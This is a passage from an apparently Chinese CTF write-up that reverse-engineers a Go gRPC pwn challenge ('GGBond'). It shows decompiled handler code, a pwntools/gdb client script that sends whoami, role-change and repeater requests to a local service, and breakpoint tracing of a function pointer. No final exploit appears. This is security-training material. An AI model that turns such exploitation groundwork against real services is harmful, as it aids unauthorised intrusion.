  __int64 v26<span class="token punctuation">;</span> <span class="token comment">// [rsp+360h] [rbp-18h]</span>
  __int64 v27<span class="token punctuation">;</span> <span class="token comment">// [rsp+368h] [rbp-10h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v29<span class="token punctuation">;</span> <span class="token comment">// [rsp+380h] [rbp+8h]</span>
  __int64 v32<span class="token punctuation">;</span> <span class="token comment">// [rsp+390h] [rbp+18h]</span>
  __int64 v33<span class="token punctuation">;</span> <span class="token comment">// [rsp+390h] [rbp+18h]</span>
  <span class="token function">__int64</span> <span class="token punctuation">(</span>__golang <span class="token operator">*</span><span class="token operator">*</span>v37<span class="token punctuation">)</span><span class="token punctuation">(</span>__int64<span class="token punctuation">,</span> __int64<span class="token punctuation">,</span> RTYPE <span class="token operator">*</span><span class="token punctuation">,</span> ggbond_Request <span class="token operator">*</span><span class="token punctuation">,</span> grpc_UnaryServerInfo <span class="token operator">*</span><span class="token punctuation">,</span> _QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+3A8h] [rbp+30h]</span>
  <span class="token function">__int64</span> <span class="token punctuation">(</span>__golang <span class="token operator">*</span><span class="token operator">*</span>v38<span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> _QWORD<span class="token punctuation">,</span> RTYPE <span class="token operator">*</span><span class="token punctuation">,</span> ggbond_Request <span class="token operator">*</span><span class="token punctuation">,</span> grpc_UnaryServerInfo <span class="token operator">*</span><span class="token punctuation">,</span> _QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+3A8h] [rbp+30h]</span>

  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v21 <span class="token operator">&lt;=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v29 <span class="token operator">=</span> a1<span class="token punctuation">;</span>
    v33 <span class="token operator">=</span> a3<span class="token punctuation">;</span>
    v38 <span class="token operator">=</span> a6<span class="token punctuation">;</span>
    <span class="token function">runtime_morestack_noctxt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a1 <span class="token operator">=</span> v29<span class="token punctuation">;</span>
    a3 <span class="token operator">=</span> v33<span class="token punctuation">;</span>
    a6 <span class="token operator">=</span> v38<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v37 <span class="token operator">=</span> a6<span class="token punctuation">;</span>
  v32 <span class="token operator">=</span> a3<span class="token punctuation">;</span>
  v24 <span class="token operator">=</span> a1<span class="token punctuation">;</span>
  p_ggbond_Request <span class="token operator">=</span> <span class="token punctuation">(</span>ggbond_Request <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">runtime_newobject</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>RTYPE_ggbond_Request<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">*</span>a5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>RTYPE__ptr_ggbond_Request<span class="token punctuation">,</span> p_ggbond_Request<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v37 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    p_grpc_UnaryServerInfo <span class="token operator">=</span> <span class="token punctuation">(</span>grpc_UnaryServerInfo <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">runtime_newobject</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>RTYPE_grpc_UnaryServerInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
    p_grpc_UnaryServerInfo<span class="token operator">-></span>Server<span class="token punctuation">.</span>tab <span class="token operator">=</span> v24<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_C95060 <span class="token punctuation">)</span>
      p_grpc_UnaryServerInfo <span class="token operator">=</span> <span class="token punctuation">(</span>grpc_UnaryServerInfo <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">runtime_gcWriteBarrierDX</span><span class="token punctuation">(</span>
                                                         <span class="token operator">&amp;</span>p_grpc_UnaryServerInfo<span class="token operator">-></span>Server<span class="token punctuation">.</span>data<span class="token punctuation">,</span>
                                                         a5<span class="token punctuation">,</span>
                                                         a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
      p_grpc_UnaryServerInfo<span class="token operator">-></span>Server<span class="token punctuation">.</span>data <span class="token operator">=</span> a2<span class="token punctuation">;</span>
    v22 <span class="token operator">=</span> p_grpc_UnaryServerInfo<span class="token punctuation">;</span>
    p_grpc_UnaryServerInfo<span class="token operator">-></span>FullMethod<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">28LL</span><span class="token punctuation">;</span>
    p_grpc_UnaryServerInfo<span class="token operator">-></span>FullMethod<span class="token punctuation">.</span>ptr <span class="token operator">=</span> <span class="token string">"/GGBond.GGBondServer/Handler"</span><span class="token punctuation">;</span>
    v14 <span class="token operator">=</span> <span class="token function">runtime_newobject</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> RTYPE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_866D80<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span>v14 <span class="token operator">=</span> main_ggbond__GGBondServer_Handler_Handler_func1<span class="token punctuation">;</span>
    v17 <span class="token operator">=</span> v24<span class="token punctuation">;</span>
    v14<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v24<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_C95060 <span class="token punctuation">)</span>
      v14 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">runtime_gcWriteBarrierR9</span><span class="token punctuation">(</span>v14 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> a5<span class="token punctuation">,</span> v15<span class="token punctuation">,</span> v17<span class="token punctuation">,</span> v16<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
      v14<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> a2<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>RTYPE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>v37<span class="token punctuation">)</span><span class="token punctuation">(</span>v32<span class="token punctuation">,</span> a4<span class="token punctuation">,</span> <span class="token operator">&amp;</span>RTYPE__ptr_ggbond_Request<span class="token punctuation">,</span> p_ggbond_Request<span class="token punctuation">,</span> v22<span class="token punctuation">,</span> v14<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>loc_468D3C<span class="token punctuation">)</span><span class="token punctuation">(</span>v20<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v25 <span class="token operator">=</span> v20<span class="token punctuation">;</span>
    v26 <span class="token operator">=</span> <span class="token number">768LL</span><span class="token punctuation">;</span>
    v27 <span class="token operator">=</span> <span class="token number">768LL</span><span class="token punctuation">;</span>
    v11 <span class="token operator">=</span> v20<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
      <span class="token operator">*</span>v11<span class="token operator">++</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
    v19 <span class="token operator">=</span> <span class="token function">runtime_assertE2I</span><span class="token punctuation">(</span>
            <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>RTYPE_ggbond_GGBondServerServer<span class="token punctuation">,</span>
            <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v24<span class="token punctuation">,</span>
            <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v11<span class="token punctuation">,</span>
            <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v20<span class="token punctuation">,</span>
            <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>a5<span class="token punctuation">,</span>
            v7<span class="token punctuation">,</span>
            v8<span class="token punctuation">,</span>
            v9<span class="token punctuation">,</span>
            v10<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__golang <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> __int64<span class="token punctuation">,</span> __int64<span class="token punctuation">,</span> ggbond_Request <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v19 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> v32<span class="token punctuation">,</span> a4<span class="token punctuation">,</span> p_ggbond_Request<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token operator">&amp;</span>RTYPE__ptr_ggbond_Response<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以发现这段代码大多数逻辑都是做资源分配，还有service信息的设置，关键的逻辑在这里，这里有一个函数指针的调用</p>
<pre class="line-numbers language-none"><code class="language-none">v19 &#x3D; runtime_assertE2I(
         (unsigned int)&amp;RTYPE_ggbond_GGBondServerServer,
         (_DWORD)v24,
         (_DWORD)v11,
         (unsigned int)v20,
         (_DWORD)a5,
         v7,
         v8,
         v9,
         v10);
 (*(void (__golang **)(void *, __int64, __int64, ggbond_Request *))(v19 + 24))(a2, v32, a4, p_ggbond_Request);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>v19 + 24这个函数指针不知道是什么地址</p>
<pre class="line-numbers language-none"><code class="language-none">.text:00000000007ED532                 mov     rdi, [rsp+368h+var_30]
.text:00000000007ED53A                 mov     rdx, rcx
.text:00000000007ED53D                 mov     rcx, [rsp+368h+arg_18]
.text:00000000007ED545                 call    rdx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以用gdb.attach()打个断点看看</p>
<pre class="line-numbers language-none"><code class="language-none">import grpc

import ggbond_pb2
import ggbond_pb2_grpc

from pwn import *

def whoami(chan):
    stub&#x3D;ggbond_pb2_grpc.GGBondServerStub(chan)
    respond&#x3D;stub.Handler(ggbond_pb2.Request(whoami&#x3D;ggbond_pb2.WhoamiRequest()))
    return respond

def role_change(chan,role):
    stub&#x3D;ggbond_pb2_grpc.GGBondServerStub(chan)
    respond&#x3D;stub.Handler(ggbond_pb2.Request(role_change&#x3D;ggbond_pb2.RoleChangeRequest(role&#x3D;role)))
    return respond

def repeater(chan,message):
    stub&#x3D;ggbond_pb2_grpc.GGBondServerStub(chan)
    respond&#x3D;stub.Handler(ggbond_pb2.Request(repeater&#x3D;ggbond_pb2.RepeaterRequest(message&#x3D;message)))
    return respond

file_path &#x3D; &#39;.&#x2F;pwn&#39;
p1 &#x3D; process(file_path)

p &#x3D; remote(&quot;127.0.0.1&quot;, 23334)

channel&#x3D;grpc.insecure_channel(&#39;localhost:23334&#39;)

gdb_comm &#x3D; &#39;&#39;&#39;
b *0x00000000007ED545
c
&#39;&#39;&#39;
gdb.attach(p1,gdb_comm)

print(whoami(channel))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调用的是0x7ed860 这个地址，跟过去发现 main__ptr_server_Handler这个函数</p>
<pre class="line-numbers language-none"><code class="language-none">► 0x7ed545    call   rdx                           &lt;0x7ed860&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>main__ptr_server_Handler</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; main.(*server).Handler
&#x2F;&#x2F; local variable allocation has failed, the output may be wrong!
retval_848680 __golang main__ptr_server_Handler(_ptr_main_server a1, context_Context a2, _ptr_ggbond_Request p_data)
&#123;
  __int64 v3; &#x2F;&#x2F; rsi
  __int64 v4; &#x2F;&#x2F; r14
  __int128 v5; &#x2F;&#x2F; xmm15
  RTYPE **tab; &#x2F;&#x2F; rcx
  ggbond_Response_Whoami *p_ggbond_Response_Whoami; &#x2F;&#x2F; rax
  __int64 v8; &#x2F;&#x2F; rdx
  ggbond_Response *p_ggbond_Response; &#x2F;&#x2F; rax
  int v10; &#x2F;&#x2F; r9d
  __int64 v11; &#x2F;&#x2F; r10
  int v12; &#x2F;&#x2F; r11d
  RTYPE **v13; &#x2F;&#x2F; rcx
  __int64 *v14; &#x2F;&#x2F; r8
  __int64 v15; &#x2F;&#x2F; rax
  __int64 v16; &#x2F;&#x2F; rdi
  ggbond_Response *v17; &#x2F;&#x2F; rax
  void *v18; &#x2F;&#x2F; rbx
  void *v19; &#x2F;&#x2F; rcx
  ggbond_Response_RoleChange *p_ggbond_Response_RoleChange; &#x2F;&#x2F; rax
  __int64 v21; &#x2F;&#x2F; rdx
  __int64 v22; &#x2F;&#x2F; r8
  __int64 v23; &#x2F;&#x2F; r9
  int v24; &#x2F;&#x2F; r10d
  RTYPE **v25; &#x2F;&#x2F; rcx
  RTYPE **v26; &#x2F;&#x2F; r10
  __int64 *v27; &#x2F;&#x2F; r11
  __int64 v28; &#x2F;&#x2F; rax
  __int64 v29; &#x2F;&#x2F; rdi
  __int64 *v30; &#x2F;&#x2F; rsi
  __int64 v31; &#x2F;&#x2F; rdi
  ggbond_Response_Repeater *p_ggbond_Response_Repeater; &#x2F;&#x2F; rax
  __int64 v33; &#x2F;&#x2F; rdx
  ggbond_Response *v34; &#x2F;&#x2F; rax
  __int64 v35; &#x2F;&#x2F; r9
  __int64 v36; &#x2F;&#x2F; r10
  int v37; &#x2F;&#x2F; r11d
  RTYPE **v38; &#x2F;&#x2F; rcx
  __int64 *v39; &#x2F;&#x2F; r8
  void *v40; &#x2F;&#x2F; rbx
  __int64 v41; &#x2F;&#x2F; rax
  int v42; &#x2F;&#x2F; r8d
  int v43; &#x2F;&#x2F; r9d
  int v44; &#x2F;&#x2F; r10d
  __int64 v45; &#x2F;&#x2F; rdi
  RTYPE **v46; &#x2F;&#x2F; rax
  __int128 *v47; &#x2F;&#x2F; rsi
  uint8 *v48; &#x2F;&#x2F; rdi
  __int64 i; &#x2F;&#x2F; rax
  ggbond_Response_Repeater *v50; &#x2F;&#x2F; rax
  __int64 v51; &#x2F;&#x2F; rdx
  ggbond_Response *v52; &#x2F;&#x2F; rax
  __int64 v53; &#x2F;&#x2F; r8
  __int64 v54; &#x2F;&#x2F; r9
  RTYPE **v55; &#x2F;&#x2F; rcx
  __int64 *v56; &#x2F;&#x2F; r10
  void *v57; &#x2F;&#x2F; rbx
  void *v58; &#x2F;&#x2F; rcx
  RTYPE **v59; &#x2F;&#x2F; r11
  void *v60; &#x2F;&#x2F; rdx
  __int64 v61; &#x2F;&#x2F; rax
  __int64 v62; &#x2F;&#x2F; rdi
  ggbond_Response_Error *p_ggbond_Response_Error; &#x2F;&#x2F; rax
  __int64 v64; &#x2F;&#x2F; rdx
  int v65; &#x2F;&#x2F; r8d
  int v66; &#x2F;&#x2F; r9d
  int v67; &#x2F;&#x2F; r10d
  RTYPE **v68; &#x2F;&#x2F; rcx
  __int64 *v69; &#x2F;&#x2F; rsi
  __int64 v70; &#x2F;&#x2F; rdi
  unsigned int v71; &#x2F;&#x2F; [rsp+0h] [rbp-D4h]
  size_t len; &#x2F;&#x2F; [rsp+4h] [rbp-D0h]
  __int128 v73[2]; &#x2F;&#x2F; [rsp+Ch] [rbp-C8h] BYREF
  ggbond_Response *v74; &#x2F;&#x2F; [rsp+2Ch] [rbp-A8h]
  ggbond_Response *v75; &#x2F;&#x2F; [rsp+34h] [rbp-A0h]
  ggbond_Response *v76; &#x2F;&#x2F; [rsp+3Ch] [rbp-98h]
  ggbond_Response *v77; &#x2F;&#x2F; [rsp+44h] [rbp-90h] BYREF
  ggbond_WhoamiResponse *p_ggbond_WhoamiResponse; &#x2F;&#x2F; [rsp+4Ch] [rbp-88h]
  ggbond_RoleChangeResponse *p_ggbond_RoleChangeResponse; &#x2F;&#x2F; [rsp+54h] [rbp-80h]
  ggbond_RepeaterResponse *p_ggbond_RepeaterResponse; &#x2F;&#x2F; [rsp+5Ch] [rbp-78h]
  ggbond_RepeaterResponse *v81; &#x2F;&#x2F; [rsp+64h] [rbp-70h]
  ggbond_ErrorResponse *p_ggbond_ErrorResponse; &#x2F;&#x2F; [rsp+6Ch] [rbp-68h]
  ggbond_Response_Error *v83; &#x2F;&#x2F; [rsp+74h] [rbp-60h]
  ggbond_Response_Repeater *v84; &#x2F;&#x2F; [rsp+7Ch] [rbp-58h]
  ggbond_Response_RoleChange *v85; &#x2F;&#x2F; [rsp+84h] [rbp-50h]
  __int64 *v86; &#x2F;&#x2F; [rsp+8Ch] [rbp-48h]
  ggbond_Response_Whoami *v87; &#x2F;&#x2F; [rsp+94h] [rbp-40h]
  uint8 *ptr; &#x2F;&#x2F; [rsp+9Ch] [rbp-38h]
  size_t v89; &#x2F;&#x2F; [rsp+A4h] [rbp-30h]
  size_t cap; &#x2F;&#x2F; [rsp+ACh] [rbp-28h]
  __int128 *v91; &#x2F;&#x2F; [rsp+B4h] [rbp-20h]
  __int64 v92; &#x2F;&#x2F; [rsp+BCh] [rbp-18h]
  __int64 v93; &#x2F;&#x2F; [rsp+C4h] [rbp-10h]
  main_server *v94; &#x2F;&#x2F; [rsp+DCh] [rbp+8h]
  void *data; &#x2F;&#x2F; [rsp+ECh] [rbp+18h]
  _ptr_ggbond_Request v96; &#x2F;&#x2F; [rsp+F4h] [rbp+20h]
  string v97; &#x2F;&#x2F; 0:rbx.8,8:rcx.8
  retval_848680 result; &#x2F;&#x2F; 0:rax.8,8:rbx.8,16:rcx.8
  retval_83EE40 v99; &#x2F;&#x2F; 0:rax.8,8:rbx.8,16:rcx.8,24:rdi.16

  while ( (unsigned __int64)&amp;v77 &lt;&#x3D; *(_QWORD *)(v4 + 16) )
  &#123;
    v94 &#x3D; a1;
    data &#x3D; a2.data;
    runtime_morestack_noctxt();
    a1 &#x3D; v94;
    a2.data &#x3D; data;
  &#125;
  tab &#x3D; (RTYPE **)p_data-&gt;Request.tab;
  if ( !tab )
    goto LABEL_63;
  if ( tab &#x3D;&#x3D; off_979A00 )
  &#123;
    p_ggbond_WhoamiResponse &#x3D; (ggbond_WhoamiResponse *)runtime_newobject(&amp;RTYPE_ggbond_WhoamiResponse);
    p_ggbond_Response_Whoami &#x3D; (ggbond_Response_Whoami *)runtime_newobject(&amp;RTYPE_ggbond_Response_Whoami);
    v87 &#x3D; p_ggbond_Response_Whoami;
    if ( dword_C95060 )
    &#123;
      p_data &#x3D; (_ptr_ggbond_Request)p_ggbond_Response_Whoami;
      runtime_gcWriteBarrierCX(p_ggbond_Response_Whoami, v3, v8);
    &#125;
    else
    &#123;
      p_ggbond_Response_Whoami-&gt;Whoami &#x3D; p_ggbond_WhoamiResponse;
    &#125;
    p_ggbond_Response &#x3D; (ggbond_Response *)runtime_newobject(&amp;RTYPE_ggbond_Response);
    v13 &#x3D; off_979AA0;
    p_ggbond_Response-&gt;Response.tab &#x3D; off_979AA0;
    if ( dword_C95060 )
    &#123;
      p_data &#x3D; (_ptr_ggbond_Request)&amp;p_ggbond_Response-&gt;Response.data;
      p_ggbond_Response &#x3D; (ggbond_Response *)runtime_gcWriteBarrierDX(&amp;p_ggbond_Response-&gt;Response.data, v3);
    &#125;
    else
    &#123;
      p_ggbond_Response-&gt;Response.data &#x3D; v87;
    &#125;
    v14 &#x3D; (__int64 *)p_ggbond_Response-&gt;Response.data;
    if ( p_ggbond_Response-&gt;Response.tab !&#x3D; v13 )
      runtime_panicdottypeI(
        p_ggbond_Response-&gt;Response.tab,
        (unsigned int)&amp;RTYPE__ptr_ggbond_Response_Whoami,
        (unsigned int)&amp;RTYPE_ggbond_isResponse_Response,
        (_DWORD)p_data,
        v3,
        (_DWORD)v14,
        v10,
        v11);
    if ( qword_C525A8 &lt;&#x3D; (unsigned __int64)qword_C94B80 )
      runtime_panicIndex(
        qword_C94B80,
        &amp;RTYPE__ptr_ggbond_Response_Whoami,
        qword_C525A8,
        p_data,
        v3,
        v14,
        off_C525A0,
        v11);
    v77 &#x3D; p_ggbond_Response;
    v86 &#x3D; v14;
    v15 &#x3D; runtime_concatstring2(
            0,
            (unsigned int)&quot;I&#39;m IDLEIMAGINFOIcy;Ifr;Int;IumlJcy;Jfr;JulyJuneKcy;Kfr;KindLEAFLcy;Lfr;LisuLsh;MBoxMap;Mcy;Mfr;MiaoModiNONENameNcy;NewaNfr;Not;Ocy;Ofr;OumlPINGPOSTPagePathPcy;Pfr;Phi;PortPrefPsi;QUOTQfr;REG;Rcy;Rfr;Rho;Rsh;Scy;Sfr;Sub;Sum;Sup;Tab;Tau;Tcy;Tfr;ThaiTrueTypeUcy;Ufr;UumlVcy;Vee;Vfr;Wfr;Xfr;Ycy;Yfr;Zcy;Zfr;\&quot;%d\&quot;\&quot;, \&quot;\&quot;OK\&quot;\&quot;&#96;&#39;&#x2F;\\&#x2F;[]&quot;,
            4,
            (unsigned int)off_C525A0[2 * qword_C94B80],
            (unsigned int)off_C525A0[2 * qword_C94B80 + 1],
            (_DWORD)v14,
            (_DWORD)off_C525A0,
            v11,
            v12);
    v16 &#x3D; *v86;
    *(_QWORD *)(*v86 + 48) &#x3D; &quot;I&#39;m IDLEIMAGINFOIcy;Ifr;Int;IumlJcy;Jfr;JulyJuneKcy;Kfr;KindLEAFLcy;Lfr;LisuLsh;MBoxMap;Mcy;Mfr;MiaoModiNONENameNcy;NewaNfr;Not;Ocy;Ofr;OumlPINGPOSTPagePathPcy;Pfr;Phi;PortPrefPsi;QUOTQfr;REG;Rcy;Rfr;Rho;Rsh;Scy;Sfr;Sub;Sum;Sup;Tab;Tau;Tcy;Tfr;ThaiTrueTypeUcy;Ufr;UumlVcy;Vee;Vfr;Wfr;Xfr;Ycy;Yfr;Zcy;Zfr;\&quot;%d\&quot;\&quot;, \&quot;\&quot;OK\&quot;\&quot;&#96;&#39;&#x2F;\\&#x2F;[]&quot;;
    if ( dword_C95060 )
      runtime_gcWriteBarrier(v16 + 40);
    else
      *(_QWORD *)(v16 + 40) &#x3D; v15;
    v17 &#x3D; v77;
    v18 &#x3D; 0LL;
    v19 &#x3D; 0LL;
    goto LABEL_90;
  &#125;
  if ( tab &#x3D;&#x3D; off_9799E0 )
  &#123;
    v71 &#x3D; *(_DWORD *)(*(_QWORD *)p_data-&gt;Request.data + 40LL);
    p_ggbond_RoleChangeResponse &#x3D; (ggbond_RoleChangeResponse *)runtime_newobject(&amp;RTYPE_ggbond_RoleChangeResponse);
    p_ggbond_Response_RoleChange &#x3D; (ggbond_Response_RoleChange *)runtime_newobject(&amp;RTYPE_ggbond_Response_RoleChange);
    v85 &#x3D; p_ggbond_Response_RoleChange;
    if ( dword_C95060 )
    &#123;
      p_data &#x3D; (_ptr_ggbond_Request)p_ggbond_Response_RoleChange;
      runtime_gcWriteBarrierCX(p_ggbond_Response_RoleChange, v3, v21);
    &#125;
    else
    &#123;
      p_ggbond_Response_RoleChange-&gt;RoleChange &#x3D; p_ggbond_RoleChangeResponse;
    &#125;
    v17 &#x3D; (ggbond_Response *)runtime_newobject(&amp;RTYPE_ggbond_Response);
    v25 &#x3D; off_979A80;
    v17-&gt;Response.tab &#x3D; off_979A80;
    if ( dword_C95060 )
    &#123;
      p_data &#x3D; (_ptr_ggbond_Request)&amp;v17-&gt;Response.data;
      v17 &#x3D; (ggbond_Response *)runtime_gcWriteBarrierDX(&amp;v17-&gt;Response.data, v3);
    &#125;
    else
    &#123;
      v17-&gt;Response.data &#x3D; v85;
    &#125;
    if ( v71 &gt; 3 )
    &#123;
      v30 &#x3D; (__int64 *)v17-&gt;Response.data;
      if ( v17-&gt;Response.tab !&#x3D; v25 )
        runtime_panicdottypeI(
          v17-&gt;Response.tab,
          (unsigned int)&amp;RTYPE__ptr_ggbond_Response_RoleChange,
          (unsigned int)&amp;RTYPE_ggbond_isResponse_Response,
          (_DWORD)p_data,
          (_DWORD)v30,
          v22,
          v23,
          v24);
      v31 &#x3D; *v30;
      *(_QWORD *)(*v30 + 48) &#x3D; 15LL;
      if ( dword_C95060 )
        v17 &#x3D; (ggbond_Response *)runtime_gcWriteBarrierDX(v31 + 40, v30);
      else
        *(_QWORD *)(v31 + 40) &#x3D; &quot;Role No Change.ShortDownArrow;ShortLeftArrow;SquareSuperset;The server portTildeFullEqual;UNAUTHENTICATEDUnauthenticatedUpperLeftArrow;X-Forwarded-ForZeroWidthSpace;\&quot;UNIMPLEMENTED\&quot;]\n\tmorebuf&#x3D;&#123;pc:accept-encodingaccept-languageadvertise erroraggregate_valueapplication&#x2F;pdfasyncpreemptoffavx512vpopcntdqbad certificatebad trailer keycontenteditablecopy_file_rangecurvearrowleft;double scavengedoublebarwedge;downdownarrows;duplicated nameelem size wrongextension_rangeforce gc (idle)hookrightarrow;html&#x2F;template: invalid addressinvalid argSizeinvalid booleaninvalid kind %vinvalid paddinginvalid pointerjstmpllitinterpkey has expiredleftleftarrows;leftrightarrow;leftthreetimes;longrightarrow;looparrowright;malloc deadlockmisaligned maskmissing addressmissing mcache?ms: gomaxprocs&#x3D;negative offsetnetwork is downno dot in fieldno medium foundno such processnon-minimal tagnot a directorynshortparallel;ntriangleright;preempt SPWRITEproto3_optionalrecord overflowrecovery failedreflectlite.Setrightarrowtail;rightharpoonup;runtime error: runtime: frame runtime: max &#x3D; runtime: min &#x3D; runtimer: bad pscan missed a gstartm: m has pstopm holding psync.Mutex.Locktemplate clausetraceback stucktrianglelefteq;unclosed actionunexpected typeunknown Go typeunknown networkunverified_lazyupharpoonright;weak_dependency already; errno&#x3D; mheap.sweepgen&#x3D; not in ranges:\n untyped locals %s %s HTTP&#x2F;1.1\r\n%s overflows int, not a function.WithValue(type &#x2F;etc&#x2F;resolv.conf0123456789ABCDEF0123456789abcdef2384185791015625: value of type &lt;stream: %p, %v&gt;Already ReportedAttributes: %v, CloseCurlyQuote;Content-EncodingContent-LanguageContent-Length: ContourIntegral;DeadlineExceededDoubleDownArrow;DoubleLeftArrow;DownRightVector;FRAME_SIZE_ERRORGC scavenge waitGC worker (idle)GODEBUG: value \&quot;GOTRACEBACK&#x3D;noneINVALID_ARGUMENTImperial_AramaicInstRuneAnyNotNLLeftRightVector;LeftTriangleBar;LeftUpTeeVector;LeftUpVectorBar;LowerRightArrow;Meroitic_CursiveMultiple ChoicesNotGreaterEqual;NotGreaterTilde;NotHumpDownHump;NotLeftTriangle;NotSquareSubset;Other_AlphabeticOverParenthesis;Payment RequiredPermissionDeniedProxy-ConnectionRCodeFormatErrorRETENTION_SOURCERightDownVector;SETTINGS_TIMEOUTSIGNONE: no trapServerName: %q, ShortRightArrow;TARGET_TYPE_ENUMTARGET_TYPE_FILEUpgrade RequiredUpperRightArrow;User-Agent: %s\r\nWww-AuthenticateZanabazar_Square\&quot;ALREADY_EXISTS\&quot;\nruntime stack:\n&quot;;
    &#125;
    else
    &#123;
      qword_C94B80 &#x3D; v71;
